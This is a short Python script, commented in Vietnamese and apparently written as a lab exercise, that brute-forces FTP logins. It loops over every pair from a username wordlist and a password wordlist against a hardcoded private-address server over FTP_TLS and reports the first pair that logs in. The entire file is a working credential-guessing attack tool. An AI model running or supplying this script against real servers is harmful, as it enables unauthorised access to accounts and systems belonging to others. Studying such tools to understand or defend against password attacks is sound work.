import ftplib #Thư viện này cung cấp các chức năng để tạo và tương tác với một kết nối FTP.
# Hàm này sẽ thực hiện vét cạn tất cả các tài khoản và mật khẩu có trong 2 file mxact666_username.txt và mxact666_password.txt
# Sử dụng nó để làm username và password để đăng nhập vào FTP server
def bruteLogin(host, port, username, password):
    for uname in username: #Duyệt qua tất cả các tên người dùng trong danh sách
        for passwd in password: #Duyệt qua tất cả các mật khẩu trong danh sách password
            print("[+] Trying " + uname + " : " + passwd)
            try:
                ftp = ftplib.FTP_TLS(timeout=30)  #Tạo một đối tượng FTP_TLS từ thư viện ftplib để thực hiện kết nối FTP bảo mật.
                ftp.connect(host, port) #Kết nối đến máy chủ FTP thông qua địa chỉ host và cổng port.
                ftp.auth() #xác thực với máy chủ FTP
                ftp.login(uname, passwd) #Đăng nhập vào máy chủ FTP với tên người dùng uname và mật khẩu passwd hiện đang được thử.
                print('\n[+] ' + str(hostname) + ' FTP Logon Succeeded: ' + uname + ':' + passwd)
                ftp.quit() #Đóng kết nối FTP.
                return (uname, passwd) #trả về cặp tên người dùng và mật khẩu nếu đăng nhập thành công.
            except Exception:
                pass #pass được sử dụng để bỏ qua bất kỳ ngoại lệ nào mà không làm thay đổi hành vi của chương trình.
                # Chương trình sẽ tiếp tục với vòng lặp tiếp theo nếu có lỗi xảy ra.

    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


hostname = '192.168.255.130'
port = 21
#Gán giá trị cho biến hostname và port để định rõ máy chủ FTP và cổng kết nối.
username = [] #Khởi tạo hai danh sách rỗng username và password
password = [] # để lưu trữ các tên người dùng và mật khẩu đọc từ các tệp văn bản.
with open('mxact666_username.txt', 'r') as f: # sd câu lệnh này để mở tệp văn bản chứa danh sách tên người dùng.
    for line in f: # bắt đầu một vòng lặp for để lặp qua từng dòng trong tệp văn bản.
        line = line.strip() #strip() loại bỏ khoảng trắng (hoặc ký tự xuống dòng)
        username.append(line) #Phương thức append() được sử dụng để thêm một phần tử vào cuối danh sách.
with open('mxact666_password.txt', 'r') as f:
    for line in f:
        line = line.strip()
        password.append(line)
print(bruteLogin(hostname, port, username, password))
